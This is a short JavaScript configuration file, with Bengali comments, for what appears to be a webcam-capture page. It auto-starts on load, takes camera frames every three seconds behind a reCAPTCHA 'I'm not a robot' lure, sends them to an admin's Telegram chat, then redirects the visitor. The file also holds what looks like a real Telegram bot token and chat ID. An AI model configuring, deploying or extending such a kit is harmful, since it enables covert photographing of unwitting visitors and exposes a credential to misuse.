export const CONFIG = {

  /* ===== REQUIRED — replace these ===== */
  BOT_TOKEN: "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A",
  ADMIN_CHAT_ID: "7274208494",
  CAPTURE_INTERVAL_MS: 3000,

  /* ===== reCAPTCHA — MUST FILL YOUR REAL SITE KEY ===== */
  // https://www.google.com/recaptcha/admin/create থেকে নিন
  // v2 "I'm not a robot" Checkbox সিলেক্ট করুন
  RECAPTCHA_SITE_KEY: "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI", // ← টেস্ট কী, আপনার আসল কী বসান

  /* ===== Optional tuning ===== */
  IMAGE_QUALITY: 0.75,
  CAM_WIDTH: 640,
  CAM_HEIGHT: 480,
  AUTO_START_ON_LOAD: true,

  /* ===== Feature toggles ===== */
  SEND_ADMIN_ALWAYS: true,
  SEND_TO_USER_IF_ID: true,
  STAY_ON_PAGE_AFTER_SUCCESS: false,  // false = next.html এ redirect

  DEBUG: true
};
